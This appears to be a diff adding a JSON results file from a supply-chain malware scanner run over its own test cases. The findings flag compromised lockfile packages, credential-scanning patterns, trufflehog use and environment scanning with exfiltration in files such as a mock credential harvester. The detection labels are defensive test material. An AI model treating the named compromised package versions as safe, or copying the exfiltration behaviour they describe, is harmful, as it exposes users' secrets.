+      "risk_level": "Medium",
+      "comment": "Compromised package in lockfile: @ctrl/tinycolor@4.1.2",
+      "patterns_detected": [
+        "lockfile_integrity"
+      ],
+      "details": [
+        "Lockfile contains packages that match known compromised versions",
+        "These packages may have been tampered with during the attack",
+        "Recommend regenerating lockfiles and verifying package versions",
+        "Compromised packages found: @ctrl/tinycolor@4.1.2"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/lockfile-compromised/package-lock.json",
+      "risk_level": "Medium",
+      "comment": "Compromised package in lockfile: color-convert@3.1.1",
+      "patterns_detected": [
+        "lockfile_integrity"
+      ],
+      "details": [
+        "Lockfile contains packages that match known compromised versions",
+        "These packages may have been tampered with during the attack",
+        "Recommend regenerating lockfiles and verifying package versions",
+        "Compromised packages found: color-convert@3.1.1"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/common-crypto-libs/ethers-usage.js",
+      "risk_level": "Low",
+      "comment": "Contains credential scanning patterns",
+      "patterns_detected": [
+        "credential_scanning_patterns"
+      ],
+      "details": [
+        "Contains credential scanning patterns"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/edge-case-project/node_modules/@types/node/process.d.ts",
+      "risk_level": "Low",
+      "comment": "Contains credential scanning patterns",
+      "patterns_detected": [
+        "credential_scanning_patterns"
+      ],
+      "details": [
+        "Contains credential scanning patterns"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/false-positive-project/express-server.js",
+      "risk_level": "Low",
+      "comment": "Contains credential scanning patterns",
+      "patterns_detected": [
+        "credential_scanning_patterns"
+      ],
+      "details": [
+        "Contains credential scanning patterns"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/false-positive-project/webpack.config.js",
+      "risk_level": "Low",
+      "comment": "Contains credential scanning patterns",
+      "patterns_detected": [
+        "credential_scanning_patterns"
+      ],
+      "details": [
+        "Contains credential scanning patterns"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/actual-credential-harvester.js",
+      "risk_level": "High",
+      "comment": "Credential patterns with potential exfiltration",
+      "patterns_detected": [
+        "credential_scanning_patterns",
+        "environment_scanning_with_exfiltration"
+      ],
+      "details": [
+        "Contains credential scanning patterns",
+        "Credential patterns with potential exfiltration detected",
+        "Environment scanning with exfiltration detected"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/malicious-trufflehog-wrapper.sh",
+      "risk_level": "High",
+      "comment": "Credential patterns with potential exfiltration",
+      "patterns_detected": [
+        "trufflehog_references",
+        "trufflehog_binary",
+        "credential_scanning_patterns"
+      ],
+      "details": [
+        "Contains trufflehog references in source code",
+        "Trufflehog binary found",
+        "Contains credential scanning patterns",
+        "Credential patterns with potential exfiltration detected"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/trufflehog-script.sh",
+      "risk_level": "High",
+      "comment": "Credential patterns with potential exfiltration",
+      "patterns_detected": [
+        "trufflehog_references",
+        "trufflehog_binary",
+        "credential_scanning_patterns",
+        "suspicious_env_access"
+      ],
+      "details": [
+        "Contains trufflehog references in source code",
+        "Trufflehog binary found",
+        "Contains credential scanning patterns",
+        "Potentially suspicious environment variable access"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/legitimate-crypto/wallet-utils.js",
+      "risk_level": "Low",
+      "comment": "Contains credential scanning patterns",
+      "patterns_detected": [
+        "credential_scanning_patterns",
+        "suspicious_env_access"
+      ],
+      "details": [
+        "Contains credential scanning patterns",
+        "Potentially suspicious environment variable access"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/legitimate-security-project/security-scanner.py",
+      "risk_level": "High",
+      "comment": "Credential patterns with potential exfiltration",
+      "patterns_detected": [
+        "trufflehog_references",
+        "trufflehog_binary",
+        "credential_scanning_patterns",
+        "suspicious_env_access"
+      ],
+      "details": [
+        "Contains trufflehog references in source code",
+        "Trufflehog binary found",
+        "Contains credential scanning patterns",
+        "Potentially suspicious environment variable access"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/network-exfiltration-project/malicious.js",
+      "risk_level": "High",
+      "comment": "Credential patterns with potential exfiltration",
+      "patterns_detected": [
+        "environment_scanning_with_exfiltration"
+      ],
+      "details": [
+        "Environment scanning with exfiltration detected"
+      ]
+    }
+  ],
+  "summary": {
+    "high_risk_count": 25,
+    "medium_risk_count": 52,
+    "low_risk_count": 30,
+    "total_issues": 107
+  }
+}
